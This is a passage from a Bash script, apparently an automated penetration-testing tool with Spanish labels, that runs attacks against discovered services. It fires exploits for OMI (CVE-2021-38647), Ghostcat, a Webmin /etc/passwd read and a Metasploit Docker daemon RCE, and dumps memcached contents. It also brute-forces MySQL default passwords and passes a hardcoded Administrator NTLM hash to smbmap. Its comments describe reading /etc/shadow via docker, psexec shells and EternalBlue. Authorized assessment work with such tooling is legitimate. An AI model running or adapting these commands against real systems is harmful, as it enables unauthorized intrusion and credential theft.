		echo "$proxychains  nmap -Pn -sUC -n  -p $port $ip" > logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
		nmap -Pn -sUC -n  -p $port $ip >> logs/enumeracion/"$ip"_"mDNS"_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"mDNS"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|zeroconf" > .enumeracion/"$ip"_"mDNS"_info.txt 
	
		echo "pholus3.py eth0 -rq -stimeout 10" > logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
		pholus3.py eth0 -rq -stimeout 10 | tee -a logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
		#cat logs/enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null > .enumeracion/"$ip"_"mDNS"_enum.txt 2>/dev/null
	done

	insert_data
fi



if [ -f servicios/OMI.txt ]
	then
	echo -e "$OKBLUE #################### OMI (`wc -l servicios/OMI.txt`) ######################$RESET"	    
	for line in $(cat servicios/OMI.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		#CVE-2021-38647
		echo "omigod.py -t $ip -c id  (CVE-2021-38647)" > logs/vulnerabilidades/"$ip"_"OMI"_info.txt 2>/dev/null
		$proxychains omigod.py -t $ip -c id >> logs/vulnerabilidades/"$ip"_"OMI"_info.txt 2>/dev/null
		grep "uid" logs/vulnerabilidades/"$ip"_"OMI"_info.txt > .vulnerabilidades/"$ip"_"OMI"_info.txt

	done

	insert_data
fi

if [ -f servicios/RabbitMQ.txt ]
	then
	echo -e "$OKBLUE #################### RabbitMQ (`wc -l servicios/RabbitMQ.txt`) ######################$RESET"	    
	for line in $(cat servicios/RabbitMQ.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "$proxychains  nmap -Pn -n -sT --script=amqp-info -p $port $ip" > logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
		$proxychains  nmap -Pn -n -sT --script=amqp-info -p $port $ip >> logs/enumeracion/"$ip"_"RabbitMQ"_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_"RabbitMQ"_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_"RabbitMQ"_info.txt 

	done

	insert_data
fi


if [ -f servicios/cassandra.txt ]
	then
	echo -e "$OKBLUE #################### cassandra (`wc -l servicios/cassandra.txt`) ######################$RESET"	    
	for line in $(cat servicios/cassandra.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		echo "$proxychains  nmap -Pn -n -sT --script=cassandra-info  -p $port $ip" > logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
		$proxychains nmap -Pn -n -sT --script=cassandra-info  -p $port $ip >> logs/enumeracion/"$ip"_cassandra_info.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_cassandra_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_cassandra_info.txt 

		# cqlsh <IP>
		# #Basic info enumeration
		# SELECT cluster_name, thrift_version, data_center, partitioner, native_protocol_version, rack, release_version from system.local;
		# #Keyspace enumeration
		# SELECT keyspace_name FROM system.schema_keyspaces;
		# desc <Keyspace_name>    #Decribe that DB
		# desc system_auth        #Describe the DB called system_auth
		# SELECT * from system_auth.roles;  #Retreive that info, can contain credential hashes
		# SELECT * from logdb.user_auth;    #Can contain credential hashes
		# SELECT * from logdb.user;
		# SELECT * from configuration."config";
		
	done

	insert_data
fi



if [ -f servicios/NDMP.txt ]
	then
	echo -e "$OKBLUE #################### NDMP (`wc -l servicios/NDMP.txt`) ######################$RESET"	    
	for line in $(cat servicios/NDMP.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		echo "$proxychains  nmap -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip" > logs/enumeracion/"$ip"_NDMP_info.txt 2>/dev/null
		$proxychains nmap -sT -n -Pn --script=ndmp-fs-info,ndmp-version -p $port $ip >> logs/vulnerabilidades/"$ip"_NDMP_info.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_NDMP_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .vulnerabilidades/"$ip"_NDMP_info.txt 
		
	done

	insert_data
fi

if [ -f servicios/ajp13.txt ]
	then
	echo -e "$OKBLUE #################### ajp13 (`wc -l servicios/ajp13.txt`) ######################$RESET"	    
	for line in $(cat servicios/ajp13.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		echo "$proxychains  nmap -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip" > logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
		$proxychains nmap -sT -n -Pn --script=ajp-auth,ajp-headers,ajp-methods,ajp-request -p $port $ip >> logs/enumeracion/"$ip"_ajp13_proxyAuth.txt 2>/dev/null
		grep --color=never "|" logs/enumeracion/"$ip"_ajp13_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_ajp13_proxyAuth.txt 
		
		$proxychains ghostcat.py -p $port -f /WEB-INF/web.xml $ip | strings > logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt 
		egrep -iq "web-app" logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] Tomcat LFI \n $RESET"
			cp logs/vulnerabilidades/"$ip"_ajp13_ghostcat.txt .vulnerabilidades/"$ip"_ajp13_ghostcat.txt 		
		fi		
	done

	insert_data
fi



if [ -f servicios/InfluxDB.txt ]
	then
	echo -e "$OKBLUE #################### InfluxDB (`wc -l servicios/InfluxDB.txt`) ######################$RESET"	    
	for line in $(cat servicios/InfluxDB.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		#echo "influx -host $ip -port $port " > logs/vulnerabilidades/"$ip"_influx_auth.txt
		#$proxychains influx -host $ip -port $port >> logs/vulnerabilidades/"$ip"_influx_auth.txt

		echo "$proxychains msfconsole -x use auxiliary/scanner/http/influxdb_enum;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_influx_enum.txt
		$proxychains msfconsole -x "use auxiliary/scanner/http/influxdb_enum;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_influx_enum.txt 2>/dev/null
		grep "[+]" logs/vulnerabilidades/"$ip"_influx_enum.txt | grep "IPMI" | egrep -v "exploits|payloads|evasion|cowsay" | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g"  > .vulnerabilidades/"$ip"_influx_enum.txt


		
	done

	insert_data
fi




if [ -f servicios/GlusterFS.txt ]
	then
	echo -e "$OKBLUE #################### GlusterFS (`wc -l servicios/GlusterFS.txt`) ######################$RESET"	    
	for line in $(cat servicios/GlusterFS.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "gluster --remote-host=$ip volume list" > logs/enumeracion/"$ip"_"gluster"_list.txt
		$proxychains gluster --remote-host=$ip volume list  >> logs/enumeracion/"$ip"_"gluster"_list.txt
		#gluster --remote-host=$ip volume list  >> .enumeracion/"$ip"_"gluster"_list.txt

		#mount -t glusterfs 10.10.11.131:/<vol_name> /mnt/
	done

	insert_data
fi


if [ -f servicios/helm.txt ]
	then
	echo -e "$OKBLUE #################### helm (`wc -l servicios/helm.txt`) ######################$RESET"	    
	for line in $(cat servicios/helm.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo "helm --host $ip:$port version" > logs/enumeracion/"$ip"_"helm"_version.txt
		$proxychains helm --host $ip:$port version  >> logs/enumeracion/"$ip"_"helm"_version.txt
		
	done

	insert_data
fi



if [ -f servicios/EtherNet.txt ]
	then
	echo -e "$OKBLUE #################### EtherNet (`wc -l servicios/EtherNet.txt`) ######################$RESET"	    
	for line in $(cat servicios/EtherNet.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "$proxychains  nmap -n -Pn --script=enip-info -p $port $ip" > logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
		$proxychains nmap -sT -n -Pn --script=enip-info -p $port $ip >> logs/vulnerabilidades/"$ip"_EtherNet_info.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_EtherNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .vulnerabilidades/"$ip"_EtherNet_info.txt

		$proxychains python3 -m cpppo.server.enip.list_services --list-identity -a $ip > logs/vulnerabilidades/"$ip"_EtherNet_services.txt
	done

	insert_data
fi


# if [ -f servicios/BACNet.txt ]
# 	then
# 	echo -e "$OKBLUE #################### BACNet (`wc -l servicios/BACNet.txt`) ######################$RESET"	    
# 	for line in $(cat servicios/BACNet.txt); do
# 		ip=`echo $line | cut -f1 -d":"`
# 		port=`echo $line | cut -f2 -d":"`
# 		echo "$proxychains  nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip" > logs/enumeracion/"$ip"_BACNet_info.txt
# 		nmap -Pn --script bacnet-info --script-args full=yes -sU -n -sV -p $port $ip >> logs/enumeracion/"$ip"_BACNet_info.txt
# 		grep --color=never "|" logs/enumeracion/"$ip"_BACNet_info.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .enumeracion/"$ip"_BACNet_info.txt

# 	done

# 	insert_data
# fi

if [ -f servicios/hadoop-jobtracker.txt ]
	then
	echo -e "$OKBLUE #################### hadoop-jobtracker (`wc -l servicios/hadoop-jobtracker.txt`) ######################$RESET"	    
	for line in $(cat servicios/hadoop-jobtracker.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "$proxychains  nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_jobtracker.txt
		$proxychains nmap -n -Pn --script hadoop-jobtracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_jobtracker.txt
		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_jobtracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_hadoop_jobtracker.txt		
	done

	insert_data
fi
	

if [ -f servicios/hadoop-namenode.txt ]
	then
	echo -e "$OKBLUE #################### hadoop-namenode (`wc -l servicios/hadoop-namenode.txt`) ######################$RESET"	    
	for line in $(cat servicios/hadoop-namenode.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
 		echo "$proxychains  nmap -n -Pn --script hadoop-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_namenode.txt
		$proxychains nmap -n -Pn --script hadoop-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_namenode.txt
		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_namenode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_hadoop_namenode.txt		
	done

	insert_data
fi

if [ -f servicios/hadoop-datanode.txt ]
	then
	echo -e "$OKBLUE #################### hadoop-datanode (`wc -l servicios/hadoop-datanode.txt`) ######################$RESET"	    
	for line in $(cat servicios/hadoop-datanode.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
 		echo "$proxychains  nmap -n -Pn --script hadoop-datanode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_datanode.txt
		$proxychains nmap -n -Pn --script hadoop-datanode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_datanode.txt
		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_datanode.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_hadoop_datanode.txt		
	done
	insert_data
fi


if [ -f servicios/hadoop-secondary.txt ]
	then
	echo -e "$OKBLUE #################### hadoop-secondary (`wc -l servicios/hadoop-secondary.txt`) ######################$RESET"	    
	for line in $(cat servicios/hadoop-secondary.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
 		echo "$proxychains  nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_secondary.txt
		$proxychains nmap -n -Pn --script hadoop-secondary-namenode-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_secondary.txt
		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_secondary.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_hadoop_secondary.txt		
	done
	insert_data
fi



if [ -f servicios/hadoop-tasktracker.txt ]
	then
	echo -e "$OKBLUE #################### hadoop-tasktracker (`wc -l servicios/hadoop-tasktracker.txt`) ######################$RESET"	    
	for line in $(cat servicios/hadoop-tasktracker.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
 		echo "$proxychains  nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip" > logs/enumeracion/"$ip"_hadoop_tasktracker.txt
		$proxychains nmap -n -Pn --script hadoop-tasktracker-info -p $port $ip >> logs/enumeracion/"$ip"_hadoop_tasktracker.txt
		grep --color=never "|" logs/enumeracion/"$ip"_hadoop_tasktracker.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .enumeracion/"$ip"_hadoop_tasktracker.txt		
	done
	insert_data
fi


if [ -f servicios/webmin.txt ]
	then
	echo -e "$OKBLUE #################### webmin (`wc -l servicios/webmin.txt`) ######################$RESET"	    
	for line in $(cat servicios/webmin.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "webmin-CVE-2006-3392.sh $ip $port /etc/passwd" > logs/vulnerabilidades/"$ip"_webmin_LFI.txt
		$proxychains webmin-CVE-2006-3392.sh $ip $port /etc/passwd >> logs/vulnerabilidades/"$ip"_webmin_LFI.txt		
		grep bash logs/vulnerabilidades/"$ip"_webmin_LFI.txt > .vulnerabilidades/"$ip"_webmin_LFI.txt				
	done
	insert_data
fi

if [ -f servicios/memcached.txt ]
	then
	echo -e "$OKBLUE #################### memcached (`wc -l servicios/memcached.txt`) ######################$RESET"	    
	for line in $(cat servicios/memcached.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo "memcstat --servers=$ip" > logs/vulnerabilidades/"$ip"_"memcached"_memcached.txt
		$proxychains memcstat --servers=$ip >> logs/vulnerabilidades/"$ip"_"memcached"_memcached.txt
		$proxychains memccat --servers=$ip `memcdump --servers=$ip` > .vulnerabilidades/"$ip"_"memcached"_memcached.txt
		$proxychains php -r "\$c = new Memcached(); \$c->addServer('$ip', $port); var_dump( \$c->getAllKeys() );" > logs/vulnerabilidades/"$ip"_"memcached"_dump.txt
	done

	insert_data
fi


if [ -f servicios/squid.txt ]
	then
	echo -e "$OKBLUE #################### squid (`wc -l servicios/squid.txt`) ######################$RESET"	    
	for line in $(cat servicios/squid.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo "curl --proxy http://$ip:3128 http://$ip" > logs/vulnerabilidades/"$ip"_"squid"_auth.txt
		$proxychains curl --proxy http://$ip:$port http://$ip >> logs/vulnerabilidades/"$ip"_"squid"_auth.txt

		egrep -iq "DENIED" logs/vulnerabilidades/"$ip"_"squid"_auth.txt
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t$OKRED[!] No autenticacion requerida \n $RESET"
			echo "No autenticacion requerida" > .vulnerabilidades/"$ip"_"squid"_auth.txt			
		fi
		
	done

	insert_data
fi

if [ -f servicios/docker.txt ]
	then
	echo -e "$OKBLUE #################### docker (`wc -l servicios/docker.txt`) ######################$RESET"	    
	for line in $(cat servicios/docker.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		
		echo "curl -s http://$ip:$port/version | jq" > logs/enumeracion/"$ip"_"$port"_version.txt
		$proxychains curl -s http://$ip:$port/version | jq >> logs/enumeracion/"$ip"_"$port"_version.txt

		echo "$proxychains msfconsole -x use exploit/linux/http/docker_daemon_tcp;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_"$port"_RCE.txt 2>/dev/null
		$proxychains msfconsole -x "use exploit/linux/http/docker_daemon_tcp;set RHOSTS $ip;exploit;exit" >> logs/vulnerabilidades/"$ip"_"$port"_RCE.txt 2>/dev/null
		#docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
		#cat /mnt/etc/shadow
		
	done

	insert_data
fi


if [ -f servicios/proxy.txt ]
	then
	echo -e "$OKBLUE #################### proxy (`wc -l servicios/proxy.txt`) ######################$RESET"	    
	for line in $(cat servicios/proxy.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`

		echo "$proxychains  nmap -Pn --script=socks-auth-info -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
		$proxychains nmap -n -Pn --script=socks-auth-info -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyAuth.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE"> .vulnerabilidades/"$ip"_"$port"_proxyAuth.txt 

		echo "$proxychains  nmap -Pn --script=socks-brute -p $port $ip" > logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
		$proxychains nmap -n -Pn --script=socks-brute -p $port $ip >> logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_"$port"_proxyBrute.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE" > .vulnerabilidades/"$ip"_"$port"_proxyBrute.txt 

		# echo socks5 10.10.10.10 1080 username password > nano /etc/proxychains4.conf

	done

	insert_data
fi


if [ -f servicios/mysql.txt ]
	then
	echo -e "$OKBLUE #################### mysql (`wc -l servicios/mysql.txt`) ######################$RESET"	    
	for line in $(cat servicios/mysql.txt); do
		ip=`echo $line | cut -f1 -d":"`
		port=`echo $line | cut -f2 -d":"`
		echo -e "[+] Escaneando $ip:$port"

		echo "$proxychains  nmap -Pn  --script=mysql-enum -p $port $ip" > logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null
		$proxychains nmap -n -Pn --script=mysql-empty-password,mysql-enum,mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null		

		egrep -iq "No valid accounts found" logs/vulnerabilidades/"$ip"_mysql_enum.txt 2>/dev/null
		greprc=$?
		if [[ $greprc -eq 0 ]] ; then			
			echo -e "\t No valid accounts found \n"	
		else			
			grep --color=never "|" logs/vulnerabilidades/"$ip"_mysql_enum.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|not allowed" > .vulnerabilidades/"$ip"_mysql_enum.txt
		fi	

		echo "$proxychains  nmap -Pn  --script=mysql-vuln-cve2012-2122 -p $port $ip" > logs/vulnerabilidades/"$ip"_mysql_vuln.txt 2>/dev/null
		$proxychains nmap -n -Pn --script=mysql-vuln-cve2012-2122 -p $port $ip >> logs/vulnerabilidades/"$ip"_mysql_vuln.txt 2>/dev/null
		grep --color=never "|" logs/vulnerabilidades/"$ip"_mysql_vuln.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|not allowed" > .vulnerabilidades/"$ip"_mysql_vuln.txt

		echo "medusa -e n -u root -p root -h $ip -M mysql" >  logs/cracking/"$ip"_mysql_defaultPassword.txt
		$proxychains medusa -e n -u root -p root -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
		$proxychains medusa -u root -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt		
		$proxychains medusa -e n -u dbuser -p 123 -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
		$proxychains medusa -e n -u mysql -p mysql -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt
		$proxychains medusa -e n -u admin -p admin -h $ip -M mysql >>  logs/cracking/"$ip"_mysql_defaultPassword.txt

		grep --color=never -i SUCCESS logs/cracking/"$ip"_mysql_defaultPassword.txt | tee -a .vulnerabilidades/"$ip"_mysql_defaultPassword.txt

	done

	insert_data
fi

if [ -f servicios/smb.txt ]
then 
	echo -e "$OKBLUE #################### smb (`wc -l servicios/smb.txt`) ######################$RESET"	    
	cat servicios/smb.txt | cut -d ":" -f1 | sort | uniq > servicios/smb_uniq.txt 

	
	#null session
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains rpcclient -U ''%'' -N -c srvinfo _target_ >  logs/vulnerabilidades/_target__445_nullsession.txt" --silent	

	# rpcclient>srvinfo
	# rpcclient>enumdomusers
	# rpcclient>getdompwinfo	
		 
	#smb-vuln-ms08-067
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms08-067 _target_' >> logs/vulnerabilidades/_target__445_ms08067.txt " --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms08-067 _target_ > logs/vulnerabilidades/_target__445_ms08067.txt" --silent

	#smb2-security-mode
	echo "smb2-security-mode"
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT --script=smb2-security-mode.nse -p445 _target_' >> logs/vulnerabilidades/_target__445_smb2Security.txt" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb2-security-mode  _target_ >> logs/vulnerabilidades/_target__445_smb2Security.txt" --silent

	#smb-vuln-ms17-010 
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms17-010 _target_' >> logs/vulnerabilidades/_target__445_ms17010.txt " --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms17-010 _target_ >> logs/vulnerabilidades/_target__445_ms17010.txt" --silent
	#https://pentesting.mrw0l05zyn.cl/explotacion/vulnerabilidades/eternalblue-cve-2017-0144-ms17-010
	#docker run  -v "$PWD":/tmp -it exploit eternalblue  10.11.1.5  /tmp/192.168.119.205-443.exe

	#smb-double-pulsar-backdoor 
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-double-pulsar-backdoor _target_' > logs/vulnerabilidades/_target__445_doublepulsar.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-double-pulsar-backdoor _target_ >> logs/vulnerabilidades/_target__445_doublepulsar.txt 2>/dev/null" --silent

	#smb-vuln-conficker
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-conficker _target_' > logs/vulnerabilidades/_target__445_conficker.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-conficker _target_ >> logs/vulnerabilidades/_target__445_conficker.txt 2>/dev/null" --silent

	#smb-vuln-ms10-061
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms10-061 _target_' > logs/vulnerabilidades/_target__445_ms10061.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms10-061 _target_ >> logs/vulnerabilidades/_target__445_ms10061.txt 2>/dev/null" --silent

	#smb-vuln-cve-2017-7494 sambacry
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version _target_' > logs/vulnerabilidades/_target__445_sambacry.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version _target_ >> logs/vulnerabilidades/_target__445_sambacry.txt 2>/dev/null" --silent
	

	#smb-vuln-ms06-025
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms06-025 _target_' > logs/vulnerabilidades/_target__445_ms06025.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms06-025 _target_ >> logs/vulnerabilidades/_target__445_ms06025.txt 2>/dev/null" --silent

	#smb-vuln-ms07-029
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-ms07-029 _target_' > logs/vulnerabilidades/_target__445_ms07029.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-ms07-029 _target_ >> logs/vulnerabilidades/_target__445_ms07029.txt 2>/dev/null" --silent

	# smb-vuln-cve2009-3103
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'nmap -n -sT -p445 -Pn --script smb-vuln-cve2009-3103 _target_' > logs/vulnerabilidades/_target__445_ms09050.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains nmap -n -sT -p445 -Pn --script smb-vuln-cve2009-3103 _target_ >> logs/vulnerabilidades/_target__445_ms09050.txt 2>/dev/null" --silent

	#smbmap anonymous
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'smbmap -H _target_ -u anonymous -p anonymous' > logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains smbmap -H _target_ -u anonymous -p anonymous | head -20 >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null	" --silent
		
	#smbmap sinusuario
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo ''  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'smbmap -H _target_'  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains smbmap -H _target_  | head -20  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	
	#usuario admin
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo ''  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "echo 'smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H _target_ '  >> logs/vulnerabilidades/_target__445_compartidoSMB.txt 2>/dev/null" --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains smbmap -u Administrator -p aad3b435b51404eeaad3b435b51404ee:e101cbd92f05790d1a202bf91274f2e7 -H _target_ 2>/dev/null" --silent
	
	interlace -tL servicios/smb_uniq.txt -threads 5 -c 'echo smbclient --list //_target_/ -U ""%"" > logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null' --silent
	interlace -tL servicios/smb_uniq.txt -threads 5 -c "$proxychains smbclient --list //_target_/ -U ' '%' ' >> logs/vulnerabilidades/_target__445_compartidoSMBClient.txt 2>/dev/null" --silent

	#get shell
	# psexec.py <DOMAIN>/<USER>:<PASSWORD>@<IP>
